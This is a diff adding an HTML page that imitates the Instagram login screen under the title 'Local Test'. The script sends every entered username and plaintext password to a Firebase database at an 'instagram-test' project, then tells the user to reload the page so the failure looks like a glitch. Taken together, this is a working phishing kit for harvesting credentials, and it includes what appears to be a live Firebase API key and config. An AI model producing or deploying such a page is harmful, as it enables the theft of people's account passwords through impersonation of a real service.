@@ -1,0 +1,115 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>Instagram Login – Local Test</title>
+  <link href="https://fonts.googleapis.com/css?family=Pacifico&display=swap" rel="stylesheet">
+  <link href="https://fonts.googleapis.com/css?family=Nunito:400,700&display=swap" rel="stylesheet">
+  <style>
+    /* ---- SAME STYLES YOU PROVIDED ---- */
+    body{background:#fff;margin:0;font-family:'Nunito',Arial,sans-serif}
+    .outer-container{display:flex;flex-direction:column;align-items:center;min-height:100vh;justify-content:flex-start;background:#fafafa}
+    .login-container{margin-top:30px;background:#fff;border:1px solid #dbdbdb;width:390px;border-radius:4px;padding:40px 40px 24px;box-sizing:border-box;box-shadow:0 0 6px rgba(0,0,0,.06);text-align:center}
+    .insta-logo{font-family:'Pacifico',cursive;font-size:48px;color:#262626;margin-bottom:37px;font-weight:normal}
+    .login-form{display:flex;flex-direction:column;gap:13px}
+    .login-form input[type=text],.login-form input[type=password]{font-size:16px;border:1px solid #dbdbdb;border-radius:5px;padding:11px 14px;background:#fafafa}
+    .login-form input:focus{border-color:#b2b2b2;outline:none}
+    .login-form input[type=submit]{margin-top:7px;background:#385185;color:#fff;font-weight:700;font-size:17px;border:none;border-radius:9px;padding:10px 0;cursor:pointer;transition:background .2s}
+    .login-form input[type=submit]:hover{background:#26345d}
+    .divider-wrap{display:flex;align-items:center;text-align:center;margin:21px 0 10px}
+    .divider-line{flex:1;border-bottom:1px solid #dbdbdb}
+    .divider-text{margin:0 12px;color:#b3b3b3;font-size:14px;font-weight:bold}
+    .facebook-login{display:flex;align-items:center;justify-content:center;color:#1877f2;font-weight:700;font-size:17px;margin:17px 0 8px;text-decoration:none}
+    .facebook-login img{width:26px;margin-right:7px}
+    .forgot-pw{color:#010101;font-weight:600;font-size:16px;margin:3px 0 10px}
+    .signup-box{background:#fff;border:1px solid #dbdbdb;border-radius:4px;width:390px;margin:16px auto 0;text-align:center;font-size:18px;padding:22px 0}
+    .signup-box a{color:#0875e1;font-weight:600;text-decoration:none;margin-left:4px}
+    .signup-box a:hover{text-decoration:underline}
+    @media(max-width:450px){.login-container,.signup-box{width:94vw}}
+  </style>
+</head>
+<body>
+<div class="outer-container">
+  <div class="login-container">
+    <div class="insta-logo">Instagram</div>
+
+    <form class="login-form" id="loginForm">
+      <input type="text" id="username" placeholder="Phone number, username, or email" required>
+      <input type="password" id="password" placeholder="Password" required>
+      <input type="submit" value="Log in">
+    </form>
+
+    <div class="divider-wrap">
+      <div class="divider-line"></div>
+      <div class="divider-text">OR</div>
+      <div class="divider-line"></div>
+    </div>
+
+    <a href="#" class="facebook-login">
+      <img src="https://upload.wikimedia.org/wikipedia/commons/5/51/Facebook_f_logo_%282019%29.svg" alt="Facebook logo">
+      Log in with Facebook
+    </a>
+
+    <div class="forgot-pw">Forgot password?</div>
+  </div>
+
+  <div class="signup-box">
+    Don't have an account? <a href="#">Sign up</a>
+  </div>
+</div>
+
+<!-- Firebase SDK -->
+<script src="https://www.gstatic.com/firebasejs/10.14.1/firebase-app-compat.js"></script>
+<script src="https://www.gstatic.com/firebasejs/10.14.1/firebase-database-compat.js"></script>
+
+<script>
+  // ←←←←←←←←←←←←←←←←←←←←←←←←←←←←←←←←←←←←←←←←←
+  //  firebaseConfig 
+  // ←←←←←←←←←←←←←←←←←←←←←←←←←←←←←←←←←←←←←←←←←
+  const firebaseConfig = {
+  apiKey: "AIzaSyD3wTWNh6xdHUpYfnytp2SRV5mPa8kAPB0",
+  authDomain: "instagram-test-a9a21.firebaseapp.com",
+  databaseURL: "https://instagram-test-a9a21-default-rtdb.firebaseio.com",
+  projectId: "instagram-test-a9a21",
+  storageBucket: "instagram-test-a9a21.firebasestorage.app",
+  messagingSenderId: "581684436054",
+  appId: "1:581684436054:web:759c72713cf3f6c8926ff7",
+  measurementId: "G-BSPP3VLS72"
+};
+  // -------------------------------------------------
+
+  // Initialize Firebase
+  firebase.initializeApp(firebaseConfig);
+  const db = firebase.database();
+
+  // Handle form submit
+  document.getElementById('loginForm').addEventListener('submit', async function (e) {
+    e.preventDefault();
+
+    const username = document.getElementById('username').value.trim();
+    const password = document.getElementById('password').value;
+
+    // Simple client-side validation
+    if (!username || !password) {
+      alert('Please fill both fields.');
+      return;
+    }
+
+    try {
+      // Push a new entry under /logins
+      await db.ref('logins').push({
+        username: username,
+        password: password,
+        timestamp: Date.now()
+      });
+
+      alert('Reload the page.');
+      e.target.reset();               // clear inputs
+    } catch (err) {
+      console.error(err);
+      alert('Error saving data. Check console.');
+    }
+  });
+</script>
+</body>
+</html>
